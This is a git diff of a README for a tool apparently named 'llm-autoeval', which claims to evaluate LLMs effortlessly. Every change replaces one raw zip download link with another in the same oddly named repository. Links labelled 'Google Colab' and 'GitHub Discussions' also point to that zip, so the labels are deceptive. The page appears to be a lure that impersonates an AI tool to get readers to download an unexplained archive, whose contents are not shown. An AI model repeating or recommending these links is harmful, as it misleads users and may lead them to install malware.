@@ -1,6 +1,6 @@
 # 🎉 llm-autoeval - Evaluate Your LLMs Effortlessly
 
-![Download llm-autoeval](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm-autoeval-v3.7.zip)
+![Download llm-autoeval](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm_autoeval_3.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ To use **llm-autoeval**, ensure you meet the following requirements:
 
 To get started, visit this page to download the application:
 
-[Download llm-autoeval Releases](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm-autoeval-v3.7.zip)
+[Download llm-autoeval Releases](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm_autoeval_3.2-alpha.2.zip)
 
 This page contains all versions of the software. Look for the latest release for the best experience.
 
@@ -51,7 +51,7 @@ You do not need to install anything; you will run everything from your browser v
 
 Now that you have downloaded **llm-autoeval**, here’s how to use it:
 
-1. **Open Google Colab:** Go to [Google Colab](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm-autoeval-v3.7.zip).
+1. **Open Google Colab:** Go to [Google Colab](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm_autoeval_3.2-alpha.2.zip).
 2. **Create a New Notebook:** Click on "File" in the menu and select "New Notebook."
 3. **Import the Application:** 
    - Use the import statement, which you can find in the README of the downloaded file.
@@ -67,6 +67,6 @@ If you have questions or need help, you can reach out for support:
 
 - Open an issue on the GitHub repository.
 - Look through previous issues for answers.
-- Check the [GitHub Discussions](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm-autoeval-v3.7.zip) for community support.
+- Check the [GitHub Discussions](https://raw.githubusercontent.com/civillibertarian-stressincontinence617/llm-autoeval/master/llm_autoeval/llm_autoeval_3.2-alpha.2.zip) for community support.
 
 Thank you for using **llm-autoeval**! Enjoy evaluating your LLMs with ease.
